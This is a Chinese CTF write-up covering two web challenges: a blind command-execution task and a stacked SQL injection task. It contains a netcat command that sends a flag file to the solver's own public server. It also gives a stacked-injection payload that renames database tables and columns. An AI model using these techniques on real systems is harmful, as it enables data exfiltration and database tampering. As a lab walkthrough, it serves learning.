# CTF刷题WriteUp

## WEB

### "百度杯"CTF比赛 十月场——EXEC

**进入网站页面**

![image-20210501154827617](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501154827617.png)

**查看源码**

发现了vim，可能是vim泄露，于是在url地址输入了http://21b854b211034489a4ee1cb0d37b0212560fbf24f2e6468d.changame.ichunqiu.com/.index.php.swp

![image-20210501155039314](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155039314.png)

或者通过dirsearch工具扫描网站目录也可以发现 `/.index.php.swp`，也可以想到vim泄露

![image-20210501155453793](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155453793.png)

下载文件

![image-20210501155637128](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155637128.png)

下一步就是通过 `vim -r index.php.swp`恢复index.php,然后打开

~~~php
<html>
<head>
<title>blind cmd exec</title>
<meta language='utf-8' editor='vim'>
</head>
</body>
<img src=pic.gif>
<?php
/*
flag in flag233.php
*/
 function check($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '11259375';
}
if(isset($_GET[sign])&& check($_GET[sign])){
	setcookie('auth','tcp tunnel is forbidden!');
	if(isset($_POST['cmd'])){
		$command=$_POST[cmd];
		$result=exec($command);
		//echo $result;
	}
}else{
	die('no sign');
}
?>
</body>
</html>
~~~

这里有一个check函数需要绕过，很明显check函数就是把选手输入的数字一个一个的判断，查看这些数字的ASCII码是否在1-9的ASCII码之间，如果符合则验证失败。如果check函数想最后返回返回true，则`$number`需要等于'11259375'，这里可以使用十六进制来绕过即可。

代码里面的 `setcookie('auth','tcp tunnel is forbidden!');`告诉我们TCP被禁止不能用curl,而且cmd命令执行之后也没有回显，但是前面的注释告诉了我们flag文件，我们可以直接用nc命令把flag文件下过来，我们需要一台有公网ip的服务器。

在服务器上运行

~~~sh
nc -lup 39999
~~~

然后再题目那里用post方法 cmd=nc -u 你的ip地址 39999 < flag233.php

**注：这里我踩了个小坑，`cmd=nc`我输入成了 `cmd = nc`，等于号两边不能有空格。**

![image-20210501160323527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501160323527.png)

flag便传到了服务器上

![image-20210501160629527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501160629527.png)

### [强网杯 2019]随便注 1

**1.进入网址**

![image-20210501180925552](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501180925552.png)

**2.输入`1‘`符号报语法错误，再输入 `1’ #`页面正常**

![image-20210501181059554](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501181059554.png)

**3.接下来尝试 `order by`查看有几列数据显示**，然后配合 `union select`显示数据库的一些信息，但是select、delete等一些关键字被限制，到这里我知道可能被后台代码做了限制，于是去找了一些绕过限制的语句或者关键字特殊编码，但是都失败了。于是后面便没有了思路，自己还需要多努力啊。。。。多刷题！多扩展思路！

![image-20210501181535674](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501181535674.png)

**4.在网上搜了下解决方案，可以使用堆叠注入，果然可以，把全部库名都给查出来了**

![image-20210501192326812](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192326812.png)

**5.OK继续查表名**

![image-20210501192423272](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192423272.png)

**6.然后就是分别查看"1919810931114514"表与"words"表这两个表的结构**

![image-20210501192950713](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192950713.png)

![image-20210501193132021](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501193132021.png)

使用了关键字 `desc`来查看表里的字段结构，注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符

**7.由此可以想到该输入框的SQL语句应该是 `select id,data from words where id = ?`**

因为可以是堆叠查询，这时候我们可以使用改名的方法，把含有flag的"1919810931114514"表改名为words，再把flag字段改名为id，结合上面的1' or 1 #爆出表内所有的内容就可以查到flag了。

~~~sql
1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table words change flag id varchar(100) character set utf8 collate utf8_general_ci NOT NULL;desc words;#
~~~

![img](CTF%E5%88%B7%E9%A2%98WriteUp.assets/1790307-20200225003553488-841750902.png)

**8. 再用一下一开始的操作id=1' or 1=1#，最终获得flag值**

![image-20210501194343817](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501194343817.png)

